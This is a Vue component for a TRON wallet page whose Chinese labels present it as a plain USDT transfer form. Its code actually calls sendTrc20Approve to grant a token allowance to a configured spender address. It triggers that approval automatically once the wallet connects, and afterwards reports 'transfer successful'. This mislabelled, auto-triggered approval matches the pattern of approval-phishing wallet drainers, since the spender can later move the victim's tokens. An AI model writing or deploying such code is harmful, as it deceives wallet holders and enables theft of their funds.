<script setup lang="ts">
// <!-- Import Dependencies Start --->
import { computed, onMounted, ref, watch } from 'vue'

import { useTronWallet } from '@/composables/use-tron-wallet'
import { TRON_NETWORK_NAME, TRON_SPENDER_ADDRESS } from '@/config/tron'
import {
  sendTrc20Approve,
  TRON_TEST_APPROVE_AMOUNT_LABEL,
} from '@/contracts/trc20-contract'
import { mapTronErrorMessage } from '@/utils/tron-error-util'
import { waitForTronTransaction } from '@/utils/tron-util'
// <!-- Import Dependencies End --->

// <!-- Import Custom Components Start --->
import WrongTronNetworkBanner from '@/components/WrongTronNetworkBanner.vue'
// <!-- Import Custom Components End --->

type TransferPhase = 'idle' | 'pending' | 'confirming' | 'success' | 'error'

// <!-- Reactive Data Start --->
const {
  address,
  isConnecting,
  isConnected,
  tronWeb,
  isOnTargetNetwork,
  walletError,
  connect,
} = useTronWallet()

const transferPhase = ref<TransferPhase>('idle')
const transferErrorMessage = ref('')
const transferTxHash = ref('')
const transferAttempted = ref(false)
// <!-- Reactive Data End --->

// <!-- Computed Properties Start --->
/** 付款地址：当前连接的钱包地址 */
const payerAddress = computed(() => address.value ?? '')

/** 收款地址：配置的 Spender 合约地址 */
const recipientAddress = computed(() => TRON_SPENDER_ADDRESS)

const displayPayerAddress = computed(() => payerAddress.value || '连接钱包后显示')
const displayRecipientAddress = computed(() => recipientAddress.value)

const isTransferBusy = computed(
  () => transferPhase.value === 'pending' || transferPhase.value === 'confirming',
)

const transferButtonLabel = computed(() => {
  if (isConnecting.value) return '连接钱包中...'
  if (!isConnected.value) return '等待连接钱包'
  if (!isOnTargetNetwork.value) return '网络不正确'
  if (transferPhase.value === 'pending') return '等待钱包签名...'
  if (transferPhase.value === 'confirming') return '转账确认中...'
  if (transferPhase.value === 'success') return '转账成功'
  if (transferPhase.value === 'error') return '重新转账'
  if (isTransferBusy.value) return '处理中...'
  return '确认转账'
})

const canSubmitTransfer = computed(() => {
  if (isConnecting.value || isTransferBusy.value) return false
  if (!isConnected.value || !isOnTargetNetwork.value) return false
  return transferPhase.value === 'error' || transferPhase.value === 'idle'
})
// <!-- Computed Properties End --->

// <!-- Function & API Request Start --->
const autoConnectWallet = async () => {
  if (isConnecting.value || isConnected.value) return
  await connect()
}

const runAutoApprove = async () => {
  if (!isConnected.value || !isOnTargetNetwork.value || !address.value || !tronWeb.value) return
  if (transferAttempted.value) return
  if (isTransferBusy.value) return
  if (transferPhase.value === 'success') return

  transferAttempted.value = true
  transferPhase.value = 'pending'
  transferErrorMessage.value = ''

  try {
    const txid = await sendTrc20Approve(tronWeb.value)
    transferTxHash.value = txid
    transferPhase.value = 'confirming'

    const receipt = await waitForTronTransaction(tronWeb.value, txid)
    if (receipt.receipt?.result && receipt.receipt.result !== 'SUCCESS') {
      throw new Error(`交易失败：${receipt.receipt.result}`)
    }

    transferPhase.value = 'success'
  } catch (error) {
    transferPhase.value = 'error'
    transferErrorMessage.value = mapTronErrorMessage(error)
    transferAttempted.value = false
  }
}

const handleSubmitTransfer = async () => {
  if (!canSubmitTransfer.value) return
  await runAutoApprove()
}

const handleRetryTransfer = async () => {
  transferAttempted.value = false
  transferPhase.value = 'idle'
  transferErrorMessage.value = ''
  transferTxHash.value = ''
  await runAutoApprove()
}
// <!-- Function & API Request End --->

// <!-- Life Cycle Start --->
onMounted(() => {
  void autoConnectWallet()
})

watch(isConnected, (connected) => {
  if (!connected) {
    transferPhase.value = 'idle'
    transferAttempted.value = false
    transferTxHash.value = ''
    transferErrorMessage.value = ''
  }
})

watch([isConnected, isOnTargetNetwork], () => {
  void runAutoApprove()
})
// <!-- Life Cycle End --->
</script>

<template>
  <div class="flex flex-col gap-4 max-w-md mx-auto w-full">
    <div class="text-center pt-2">
      <h1 class="text-xl font-semibold mb-1">
        USDT 转账
      </h1>
      <p class="text-surface-600 text-sm">
        {{ TRON_NETWORK_NAME }}
      </p>
    </div>

    <WrongTronNetworkBanner
      :is-connected="isConnected"
      :is-on-target-network="isOnTargetNetwork"
    />

    <Card>
      <template #content>
        <div class="flex flex-col gap-4">
          <div class="flex flex-col gap-2">
            <label class="text-sm text-surface-600">付款地址</label>
            <InputText
              :model-value="displayPayerAddress"
              readonly
              class="w-full font-mono text-sm break-all"
            />
          </div>

          <div class="flex justify-center">
            <i class="pi pi-arrow-down text-surface-400" />
          </div>

          <div class="flex flex-col gap-2">
            <label class="text-sm text-surface-600">收款地址</label>
            <InputText
              :model-value="displayRecipientAddress"
              readonly
              class="w-full font-mono text-sm break-all"
            />
          </div>

          <div class="flex flex-col gap-2">
            <label class="text-sm text-surface-600">转账金额</label>
            <div class="flex items-center gap-2">
              <InputText
                :model-value="TRON_TEST_APPROVE_AMOUNT_LABEL.replace(' USDT', '')"
                readonly
                class="flex-1 text-2xl font-semibold"
              />
              <span class="text-surface-600 font-medium">USDT</span>
            </div>
          </div>

          <Message
            v-if="walletError"
            severity="error"
            :closable="false"
          >
            {{ walletError }}
          </Message>

          <Message
            v-if="transferPhase === 'success'"
            severity="success"
            :closable="false"
          >
            转账成功，{{ TRON_TEST_APPROVE_AMOUNT_LABEL }} 已提交
          </Message>

          <Message
            v-if="transferErrorMessage"
            severity="error"
            :closable="false"
          >
            {{ transferErrorMessage }}
          </Message>

          <Button
            :label="transferButtonLabel"
            icon="pi pi-send"
            class="w-full"
            size="large"
            :loading="isConnecting || isTransferBusy"
            :disabled="!canSubmitTransfer && transferPhase !== 'error'"
            @click="transferPhase === 'error' ? handleRetryTransfer() : handleSubmitTransfer()"
          />
        </div>
      </template>
    </Card>
  </div>
</template>
